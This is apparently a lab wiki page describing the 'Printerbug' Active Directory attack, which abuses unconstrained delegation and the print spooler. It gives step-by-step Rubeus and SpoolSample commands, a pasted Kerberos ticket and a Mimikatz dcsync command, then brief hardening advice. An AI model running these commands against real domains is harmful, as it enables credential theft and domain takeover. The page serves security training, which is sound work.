---
description: Abusing unconstrained delegation and the printspooler service.
---

# Printerbug

## Configuring

The unconstrained delegation is already configured in:

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Attacking

### How it works

If we have the control of a server with unconstrained delegation and if the printspooler service is enabled on a DC it is possible to force it to authenticate to this server by abusing the printspooler. Then we would be able to extract the TGT of the DC and execute a dcsync.

### Tools

* [Rubeus.exe](https://github.com/GhostPack/Rubeus)
* [Spoolsample](https://github.com/leechristensen/SpoolSample)

### Executing the attack

The attack will start from the perspective of already owning the `FILE01` server from the constrained delegation and already having access to `FILE01` using psexec.

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

1. On `FILE01` execute the following Rubeus.exe command to show all the tickets currently on the system:

```
.\Rubeus.exe triage
```

![](<../../../../.gitbook/assets/image (16) (1).png>)

2\. There is no ticket for `DC02`. We can execute the spoolsample to force the DC to authenticate to the `FILE01` server and leave a TGT ticket. We can do this with the following command:

```
.\SpoolSample.exe DC02.amsterdam.bank.local FILE01
```

![](<../../../../.gitbook/assets/image (53).png>)

3\. Now when we check if there is a ticket on `FILE01` for `DC02` and there is:

![](<../../../../.gitbook/assets/image (29) (1).png>)

4\. We can dump this ticket and reuse it and then execute a dcsync just like during the unconstrained delegation attack. But this time we need to use the Rubeus monitor function and then run the spoolsample again:

```
.\Rubeus.exe monitor /interval:1
.\SpoolSample.exe DC02.amsterdam.bank.local FILE01
```

![](<../../../../.gitbook/assets/image (6).png>)

Inject the ticket:

```
.\Rubeus.exe ptt /ticket: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
```

Download MimiKatz and execute dcsync:

```
Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
```

![](<../../../../.gitbook/assets/image (59) (1).png>)

## Defending

### Recommendations

* Tightly secure and monitor the user of AD objects with delegation set.
  * Set strong passwords and rotate them periodically.
  * Limit logons to systems.
  * Harden the systems these accounts are used.
* Add the flag "this account is sensitive and cannot be delegated"
* Add all high privileged accounts to the protected users group.

{% content-ref url="../../../../defence/hardening/protected-users-group.md" %}
[protected-users-group.md](../../../../defence/hardening/protected-users-group.md)
{% endcontent-ref %}

### Detection



## References

{% embed url="https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976" %}
